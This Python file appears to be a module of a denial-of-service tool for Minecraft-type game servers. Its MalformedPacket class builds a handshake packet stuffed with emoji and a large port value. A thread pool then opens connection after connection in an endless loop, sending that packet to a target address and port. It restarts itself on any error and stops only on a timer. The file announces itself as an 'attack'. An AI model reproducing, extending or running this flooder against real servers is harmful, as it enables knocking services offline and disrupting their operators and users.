import socket
import threading
from multiprocessing.pool import ThreadPool
from .utility import pack_varint, pack_string, int_to_unsigned


class MalformedPacket:

    def start_test(self):
        try:
            packet = b'\x03' + pack_varint(100) + pack_string(
                "🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀") + int_to_unsigned(65535) + b'\x01'

            packet = pack_varint(len(packet)) + packet
            while True:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.connect((self.address, self.port))
                server.send(packet)
                server.send(b'\x01\x00')
                server.close()
                self.packets += 1
        except Exception as e:
            print("Some issue: ", e, ". Reactivating")
            self.start_test()

    def kill_timeout(self):
        print("In total sent over", self.packets, "packets")
        raise SystemExit

    def __init__(self, time, threads, address, port):
        self.packets = 0
        self.address = address
        self.port = port
        pool = ThreadPool(processes=threads)
        print("Starting attack by malformed packet method")
        for threads in range(threads):
            pool.apply_async(self.start_test)
        threading.Timer(time, self.kill_timeout).start()
